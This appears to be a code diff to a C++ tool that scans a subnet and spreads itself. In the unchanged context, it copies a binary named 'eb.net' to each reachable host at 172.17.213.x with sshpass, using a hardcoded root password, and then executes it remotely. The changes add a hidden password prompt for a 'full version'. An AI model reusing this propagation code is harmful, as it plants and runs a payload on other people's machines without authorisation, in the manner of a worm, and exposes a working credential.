@@ -8,8 +8,28 @@
 #include <array>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <termios.h>
 
 // i am so fucking tired
+
+std::string get_pass(){
+	std::string pass;
+	char c;
+	struct termios oldt, newt;
+	tcgetattr(STDIN_FILENO, &oldt);
+	newt = oldt;
+	newt.c_lflag &= ~ECHO;
+	tcsetattr(STDIN_FILENO, TCSANOW, &newt);
+
+	while (std::cin.get(c)){
+		if(c == '\n') break;
+		pass += c;
+	} 
+
+	tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
+
+	return pass;
+}
 
 bool isPortOpen(const std::string& ip, int port, bool time=0) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -91,7 +111,9 @@ int main(int argc, char* argv[]){
 	std::string pass;
 	std::hash<std::string> hash;
 	std::cout << "Enter the password for full version: ";
-	std::cin >> pass;
+	
+	pass = get_pass();
+	
 	if(hash(pass) != 7067835266441158162) return 1;
 	else std::cout << "Running\n";
 
@@ -184,7 +206,7 @@ int main(int argc, char* argv[]){
 				command = "sshpass -p 1347QwAsZx scp -o StrictHostKeyChecking=no -o ConnectTimeout=2 eb.net root@172.17.213." + std::to_string(i) + ":/bin"; 
 				system(command.c_str());
 				std::cout << i << std::endl;
-				system(("sshpass -p 1347QwAsZx ssh root@172.17.213." + std::to_string(i) + "  /bin/./eb.net").c_str());
+				system(("sshpass -p 1347QwAsZx ssh root@172.17.213." + std::to_string(i) + " /bin/./eb.net").c_str());
 				++total;
 			}
 		}
